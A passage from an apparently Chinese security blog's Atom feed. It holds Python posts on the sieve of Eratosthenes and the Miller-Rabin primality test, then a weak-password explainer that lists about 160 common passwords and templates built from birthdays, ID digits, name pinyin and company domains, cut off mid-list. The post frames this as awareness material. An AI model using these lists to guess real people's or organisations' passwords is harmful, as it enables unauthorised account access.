1 is not prime</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        <span class="keyword">if</span> i &gt; n:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">yield</span> i</div><div class="line">        i += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime_list</span><span class="params">(n)</span>:</span></div><div class="line">    <span class="string">"""use prime screen method to generate all prime numbers less than n"""</span></div><div class="line">    super_dict = &#123;&#125;</div><div class="line">    primes_list = []</div><div class="line"></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> gen_super_dict(n):</div><div class="line">        super_dict[x] = <span class="keyword">True</span></div><div class="line"></div><div class="line">    i = <span class="number">2</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        <span class="keyword">if</span> i &gt; n:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        j = i * i</div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            <span class="keyword">if</span> j &gt; n:</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> super_dict[i]:</div><div class="line">                super_dict[j] = <span class="keyword">False</span></div><div class="line">            j += i</div><div class="line">        i += <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> super_dict.items():</div><div class="line">        <span class="keyword">if</span> value:</div><div class="line">            primes_list.append(key)</div><div class="line">    <span class="keyword">return</span> primes_list</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-埃拉托斯特尼筛法&quot;&gt;&lt;a href=&quot;#0x00-埃拉托斯特尼筛法&quot; class=&quot;headerlink&quot; title=&quot;0x00 埃拉托斯特尼筛法&quot;&gt;&lt;/a&gt;0x00 埃拉托斯特尼筛法&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://baike.baid
      
    
    </summary>
    
      <category term="学习记录" scheme="https://sunnyelf.github.io/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="生成器方法生成超大字典" scheme="https://sunnyelf.github.io/tags/%E7%94%9F%E6%88%90%E5%99%A8%E6%96%B9%E6%B3%95%E7%94%9F%E6%88%90%E8%B6%85%E5%A4%A7%E5%AD%97%E5%85%B8/"/>
    
      <category term="埃拉托斯特尼筛法" scheme="https://sunnyelf.github.io/tags/%E5%9F%83%E6%8B%89%E6%89%98%E6%96%AF%E7%89%B9%E5%B0%BC%E7%AD%9B%E6%B3%95/"/>
    
      <category term="快速生成素数" scheme="https://sunnyelf.github.io/tags/%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90%E7%B4%A0%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>python实现基于米勒拉宾素性检测算法最快的超大数素性检测</title>
    <link href="https://sunnyelf.github.io/2017/03/26/python%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E%E7%B1%B3%E5%8B%92%E6%8B%89%E5%AE%BE%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B%E7%AE%97%E6%B3%95%E6%9C%80%E5%BF%AB%E7%9A%84%E8%B6%85%E5%A4%A7%E6%95%B0%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/"/>
    <id>https://sunnyelf.github.io/2017/03/26/python实现基于米勒拉宾素性检测算法最快的超大数素性检测/</id>
    <published>2017-03-26T05:36:00.000Z</published>
    <updated>2017-10-02T19:22:31.898Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-米勒拉宾素性检测算法伪代码"><a href="#0x00-米勒拉宾素性检测算法伪代码" class="headerlink" title="0x00 米勒拉宾素性检测算法伪代码"></a>0x00 米勒拉宾素性检测算法伪代码</h2><p><a href="https://en.wikipedia.org/wiki/Miller%E2%80%93Rabin_primality_test" target="_blank" rel="external">米勒拉宾素性检测</a>算法的伪代码：</p><pre><code>Input #1: n &gt; 3, an odd integer to be tested for primality;Input #2: k, a parameter that determines the accuracy of the testOutput: composite if n is composite, otherwise probably prime</code></pre><hr><pre><code>write n − 1 = (2 ^ r) * d with d odd by factoring powers of 2 from n − 1WitnessLoop: repeat k times:   pick a random integer a in the range [2, n − 2]   x ← a^d mod n   if x = 1 or x = n − 1 then      continue WitnessLoop   repeat r − 1 times:      x ← x^2 mod n      if x = 1 then         return composite      if x = n − 1 then         continue WitnessLoop   return compositereturn probably prime</code></pre><h2 id="0x01-实现"><a href="#0x01-实现" class="headerlink" title="0x01 实现"></a>0x01 实现</h2><p>一开始针对这个米勒拉宾素性检测算法里的幂模运算，我以为用<a href="http://blog.csdn.net/linraise/article/details/17490769" target="_blank" rel="external">蒙哥马利算法－快速幂模</a>要比pow()函数更快，结果还是内置的pow()更快：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># x = a^d n n</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">montgomery</span><span class="params">(a, d, n)</span>:</span></div><div class="line">    x = <span class="number">1</span></div><div class="line">    <span class="keyword">while</span> d:</div><div class="line">        <span class="keyword">if</span> (d &amp; <span class="number">1</span>):</div><div class="line">            x = (x * a) % n</div><div class="line">        d &gt;&gt;= <span class="number">1</span>  </div><div class="line">        a = (a * a) % n</div><div class="line">    <span class="keyword">return</span> x</div></pre></td></tr></table></figure><p>上面的伪代码中a的选取是可以优化的，可以看到下面代码有实现，原理看一下<a href="https://en.wikipedia.org/wiki/Miller%E2%80%93Rabin_primality_test" target="_blank" rel="external">wikipedia</a>：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_a_list</span><span class="params">(n)</span>:</span></div><div class="line">    <span class="keyword">if</span> n &lt; <span class="number">2047</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>,]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">1373653</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">9080191</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">31</span>, <span class="number">73</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">25326001</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3215031751</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">4759123141</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">7</span>, <span class="number">61</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">1122004669633</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">13</span>, <span class="number">23</span>, <span class="number">1662803</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">2152302898747</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3474749660383</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">341550071728321</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3825123056546413051</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">318665857834031151167461</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3317044064679887385961981</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>]</div></pre></td></tr></table></figure><h2 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h2><p>用这个方法检测素数，100位10进制数平均0.0003，1000位10进制数平均0.09秒，10000位10进制数平均60秒。</p><h2 id="0x03-完整代码"><a href="#0x03-完整代码" class="headerlink" title="0x03 完整代码"></a>0x03 完整代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="comment"># author:admin[@hackfun.org]</span></div><div class="line"><span class="comment"># license:GPL v3</span></div><div class="line"><span class="comment"># blog:hackfun.org</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_a_list</span><span class="params">(n)</span>:</span></div><div class="line">    <span class="keyword">if</span> n &lt; <span class="number">2047</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>,]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">1373653</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">9080191</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">31</span>, <span class="number">73</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">25326001</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3215031751</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">4759123141</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">7</span>, <span class="number">61</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">1122004669633</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">13</span>, <span class="number">23</span>, <span class="number">1662803</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">2152302898747</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3474749660383</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">341550071728321</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3825123056546413051</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">318665857834031151167461</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>]</div><div class="line">    <span class="keyword">elif</span> n &lt; <span class="number">3317044064679887385961981</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_r_d</span><span class="params">(n)</span>:</span></div><div class="line">    n -= <span class="number">1</span></div><div class="line">    r = <span class="number">0</span></div><div class="line">    d = n</div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        <span class="keyword">if</span> n % <span class="number">2</span> != <span class="number">0</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        r += <span class="number">1</span></div><div class="line">        d = n / <span class="number">2</span></div><div class="line">        n /= <span class="number">2</span></div><div class="line">    <span class="keyword">return</span> r, d</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin_primality_test</span><span class="params">(n)</span>:</span></div><div class="line">    <span class="string">"""use miller rabin primality test to judge n whether prime"""</span></div><div class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</div><div class="line">        n = -n</div><div class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">if</span> n == <span class="number">2</span> <span class="keyword">or</span> n == <span class="number">3</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    r, d = calc_r_d(n)</div><div class="line">    a_list = select_a_list(n)</div><div class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(len(a_list)):</div><div class="line">        a = random.sample(a_list, <span class="number">1</span>)[<span class="number">0</span>] <span class="comment"># Select one non-repeating random number from the list at a time</span></div><div class="line">        a_list.remove(a)</div><div class="line">        x = pow(a, d, n)</div><div class="line">        <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">or</span> x == n - <span class="number">1</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> xrange(r - <span class="number">1</span>):</div><div class="line">            x = pow(x, <span class="number">2</span>, n)</div><div class="line">            <span class="keyword">if</span> x ==<span class="number">1</span>:</div><div class="line">                <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">            <span class="keyword">if</span> x == n - <span class="number">1</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-米勒拉宾素性检测算法伪代码&quot;&gt;&lt;a href=&quot;#0x00-米勒拉宾素性检测算法伪代码&quot; class=&quot;headerlink&quot; title=&quot;0x00 米勒拉宾素性检测算法伪代码&quot;&gt;&lt;/a&gt;0x00 米勒拉宾素性检测算法伪代码&lt;/h2&gt;&lt;p&gt;&lt;a hre
      
    
    </summary>
    
      <category term="学习记录" scheme="https://sunnyelf.github.io/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="python" scheme="https://sunnyelf.github.io/tags/python/"/>
    
      <category term="蒙哥马利算法" scheme="https://sunnyelf.github.io/tags/%E8%92%99%E5%93%A5%E9%A9%AC%E5%88%A9%E7%AE%97%E6%B3%95/"/>
    
      <category term="米勒拉宾素性检测算法" scheme="https://sunnyelf.github.io/tags/%E7%B1%B3%E5%8B%92%E6%8B%89%E5%AE%BE%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B%E7%AE%97%E6%B3%95/"/>
    
      <category term="快速幂模" scheme="https://sunnyelf.github.io/tags/%E5%BF%AB%E9%80%9F%E5%B9%82%E6%A8%A1/"/>
    
      <category term="超大数素性检测" scheme="https://sunnyelf.github.io/tags/%E8%B6%85%E5%A4%A7%E6%95%B0%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/"/>
    
      <category term="最快的超大数素性检测" scheme="https://sunnyelf.github.io/tags/%E6%9C%80%E5%BF%AB%E7%9A%84%E8%B6%85%E5%A4%A7%E6%95%B0%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>浅析弱口令</title>
    <link href="https://sunnyelf.github.io/2017/03/16/%E6%B5%85%E6%9E%90%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
    <id>https://sunnyelf.github.io/2017/03/16/浅析弱口令/</id>
    <published>2017-03-15T20:23:00.000Z</published>
    <updated>2017-10-02T19:22:31.549Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://www.hackfun.org/usr/uploads/2017/03/3619832931.png" alt="浅析弱口令.png"></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>弱口令其实是长期以来一直存在的问题，直到今天我们还能经常听某个著名厂商公司因为存在弱口令问题而导致大量内部或外部用户信息泄露，甚至商业计划和机密泄露，所以一个安全密码设置的重要性不言而喻，涉及密码，不得谈到密码的强弱，当然强弱密码的区分没有一个严格明确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或容易被破解工具破解的口令均为弱密码，在此我粗略谈谈弱密码方面，也就是我们经常说到的弱口令。</p><p>其实设置密码的强弱很大程度上与这个人的个人习惯和安全意识有关，当然还是受其他的因素的影响，比如公司出于安全考虑要求设置强密码等其他强制硬性要求，个人觉得弱口令可以大致分为两类，一类就是公共弱口令，另一类就是个人弱口令。</p><a id="more"></a><h2 id="0x01-公共弱口令"><a href="#0x01-公共弱口令" class="headerlink" title="0x01 公共弱口令"></a>0x01 公共弱口令</h2><p>公共弱口令也就是根据大量的密码数据统计得出的出现频率较高弱口令，关于这方面的弱口令统计结果有很多，在此我就列举一些出现频率比较高的公共弱口令：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div></pre></td><td class="code"><pre><div class="line">0123456789</div><div class="line">aa123456789</div><div class="line">zxcvbnm</div><div class="line">QAZ123</div><div class="line">asdfghjkl</div><div class="line">wang123456</div><div class="line">qwer1234</div><div class="line">123456789qq</div><div class="line">q123456789</div><div class="line">1qazxsw2</div><div class="line">100200</div><div class="line">123qweasd</div><div class="line">7894561230</div><div class="line">7758521</div><div class="line">123456789</div><div class="line">zxc123</div><div class="line">qq123123</div><div class="line">abcd123</div><div class="line">7758258</div><div class="line">zhang123</div><div class="line">123321</div><div class="line">1A2B3C4D</div><div class="line">asd123</div><div class="line">789456123</div><div class="line">5845201314</div><div class="line">qwe123</div><div class="line">123456.</div><div class="line">000000000</div><div class="line">qq123456789</div><div class="line">123698745</div><div class="line">1q2w3e4r</div><div class="line">nihao123</div><div class="line">123123</div><div class="line">w123456</div><div class="line">1233211234567</div><div class="line">z123456789</div><div class="line">520520</div><div class="line">7708801314520</div><div class="line">110120</div><div class="line">147258369</div><div class="line">1234554321</div><div class="line">123qwe</div><div class="line">11111111</div><div class="line">a111111</div><div class="line">584520</div><div class="line">456852</div><div class="line">wang123</div><div class="line">123456789..</div><div class="line">1q2w3e</div><div class="line">123abc</div><div class="line">qaz123456</div><div class="line">123456</div><div class="line">123456asd</div><div class="line">zxcvbnm123</div><div class="line">qazwsxedc</div><div class="line">31415926</div><div class="line">1314520520</div><div class="line">aaaaaa</div><div class="line">123456789a</div><div class="line">caonima</div><div class="line">1123581321</div><div class="line">woaini1314</div><div class="line">1234567891234567</div><div class="line">147258</div><div class="line">5201314a</div><div class="line">qwe123456</div><div class="line">love1314</div><div class="line">159753</div><div class="line">5841314520</div><div class="line">666666</div><div class="line">aa123456</div><div class="line">1q2w3e4r5t</div><div class="line">5201314</div><div class="line">1234567891</div><div class="line">1234567890</div><div class="line">123456abc</div><div class="line">qazwsx123</div><div class="line">iloveyou</div><div class="line">741852963</div><div class="line">abc123</div><div class="line">123456789.</div><div class="line">12qwaszx</div><div class="line">1111111111</div><div class="line">caonima123</div><div class="line">111111a</div><div class="line">q1w2e3</div><div class="line">q123456</div><div class="line">aptx4869</div><div class="line">0000000000000000</div><div class="line">www123456</div><div class="line">woaini123</div><div class="line">12345678910</div><div class="line">asdasd123</div><div class="line">0000000000</div><div class="line">asd123456</div><div class="line">abc123456</div><div class="line">zxc123456</div><div class="line">qq5201314</div><div class="line">a12345678</div><div class="line">qq123456</div><div class="line">5211314</div><div class="line">1111111111111111</div><div class="line">1234567899</div><div class="line">123123a</div><div class="line">123654</div><div class="line">110110</div><div class="line">12345678</div><div class="line">12345678900</div><div class="line">123123123</div><div class="line">abc123456789</div><div class="line">a000000</div><div class="line">123456q</div><div class="line">woaini1314520</div><div class="line">abcd123456</div><div class="line">aaa123</div><div class="line">000000</div><div class="line">123000</div><div class="line">qwertyuiop</div><div class="line">a5201314</div><div class="line">123456a</div><div class="line">s123456</div><div class="line">1234qwer</div><div class="line">abcd1234</div><div class="line">1357924680</div><div class="line">123456aa</div><div class="line">qwerty</div><div class="line">753951</div><div class="line">woaini</div><div class="line">5201314520</div><div class="line">111111111</div><div class="line">as123456</div><div class="line">1472583690</div><div class="line">z123456</div><div class="line">123456789abc</div><div class="line">qq1314520</div><div class="line">1qaz2wsx</div><div class="line">159357</div><div class="line">9876543210</div><div class="line">112233</div><div class="line">1314521</div><div class="line">1314520</div><div class="line">000000a</div><div class="line">987654321</div><div class="line">123456qq</div><div class="line">123456..</div><div class="line">asdasd</div><div class="line">521521</div><div class="line">52013145201314</div><div class="line">aaa123456</div><div class="line">135792468</div><div class="line">w123456789</div><div class="line">a123456789</div><div class="line">woaini521</div><div class="line">woaini520</div><div class="line">aini1314</div><div class="line">q1w2e3r4</div><div class="line">111111</div><div class="line">123456789q</div><div class="line">110120119</div><div class="line">a123123</div><div class="line">a123456</div><div class="line">a123321</div></pre></td></tr></table></figure><p></p><h2 id="0x02-个人弱口令"><a href="#0x02-个人弱口令" class="headerlink" title="0x02 个人弱口令"></a>0x02 个人弱口令</h2><p>个人弱口令往往与这个人的个人信息（姓名，生日，手机号，特殊昵称，爱好，社交软件账号，常用username,邮箱…），关系成员（家庭成员，男女朋友…），所处环境（车牌号，公司信息比如公司名称，公司成立时间或地点，公司domain等…），还有特殊的指定字符（数字，单词…），在这里我也列举一些经常出现的组合：</p><pre><code>生日                 19901014（农历和国历都可以考虑）身份证后六位         143256自己或关系成员中文名拼音           Xiaoming ...自己或关系成员中文名拼音+生日      xiaoming19901014 ...自己或关系成员中文名拼音+特定字符  xiaoming5201314 ...username+生日        mingxiaozi19901014 ...username+特定字符    mingxiaozi5201314 ...公司名拼音           JingDong  （这里没有特定针对某东，只是举个例子，虽然他们曾经出新过此类问题）公司名拼音+特定字符  jingdongxxxx公司domain           www.xx.com公司domain+时间      xx20150101username+domain      